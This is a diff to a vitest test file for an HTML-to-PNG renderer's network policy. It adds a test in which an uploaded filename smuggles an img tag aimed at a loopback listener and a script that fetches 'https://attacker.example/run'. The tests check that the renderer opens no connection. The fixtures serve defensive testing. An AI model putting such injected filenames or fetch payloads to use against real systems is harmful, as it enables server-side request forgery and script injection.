@@ -1,6 +1,6 @@
 import http from 'node:http';
 import type { AddressInfo } from 'node:net';
-import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
 import { renderHtmlToPng, resolveRemoteAssets } from './renderHtmlToPng';
 
 const PNG_MAGIC = Buffer.from('89504e470d0a1a0a', 'hex');
@@ -50,7 +50,7 @@ describe('renderHtmlToPng network policy', () => {
   it('1. never opens a connection to a loopback listener and still returns a PNG', async () => {
     connections = 0;
     requests = [];
-    const png = await renderHtmlToPng(loopbackHtml());
+    const png = await renderHtmlToPng({ kind: 'rich-html', html: loopbackHtml() });
     expect(png.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
     // Let any straggling request land before asserting.
     await new Promise((r) => setTimeout(r, 300));
@@ -61,7 +61,7 @@ describe('renderHtmlToPng network policy', () => {
   it('1b. block mode: iframe/object/link/import/script/poster to loopback open no socket', async () => {
     connections = 0;
     requests = [];
-    const png = await renderHtmlToPng(loopbackHtml(), { remoteAssets: 'block' });
+    const png = await renderHtmlToPng({ kind: 'rich-html', html: loopbackHtml() }, { remoteAssets: 'block' });
     expect(png.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
     await new Promise((r) => setTimeout(r, 300));
     expect(connections).toBe(0);
@@ -73,7 +73,7 @@ describe('renderHtmlToPng network policy', () => {
     const rewritten = await resolveRemoteAssets(html, { remoteAssets: 'block' });
     expect(rewritten).not.toContain('127.0.0.1');
     expect(rewritten).toContain('pic');
-    const png = await renderHtmlToPng(html, { remoteAssets: 'block' });
+    const png = await renderHtmlToPng({ kind: 'rich-html', html }, { remoteAssets: 'block' });
     expect(png.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
     expect(connections).toBe(0);
   }, 60000);
@@ -112,10 +112,32 @@ describe('renderHtmlToPng network policy', () => {
   });
 
   it('4. plain text/markdown-style HTML still renders to a PNG', async () => {
-    const png = await renderHtmlToPng('<pre>just some text</pre><h1>Heading</h1><table><tr><td>x</td></tr></table>', {
+    const png = await renderHtmlToPng({ kind: 'rich-html', html: '<pre>just some text</pre><h1>Heading</h1><table><tr><td>x</td></tr></table>' }, {
       width: 300,
       height: 200,
     });
     expect(png.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
+  }, 60000);
+
+  it('renders uploaded filenames as text before considering embedded image URLs', async () => {
+    connections = 0;
+    requests = [];
+    const fetchAsset = vi.fn(async () => ({ bytes: TINY_PNG, contentType: 'image/png' }));
+    const png = await renderHtmlToPng(
+      {
+        kind: 'file-placeholder',
+        fileName: `report <img src="http://127.0.0.1:${port}/from-filename"> <script>fetch("https://attacker.example/run")</script>`,
+        fileType: 'Unknown File',
+        fileSize: 'Unknown size',
+        icon: '📄',
+      },
+      { fetchAsset }
+    );
+
+    expect(png.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
+    expect(fetchAsset).not.toHaveBeenCalled();
+    await new Promise((r) => setTimeout(r, 300));
+    expect(requests).toEqual([]);
+    expect(connections).toBe(0);
   }, 60000);
 });
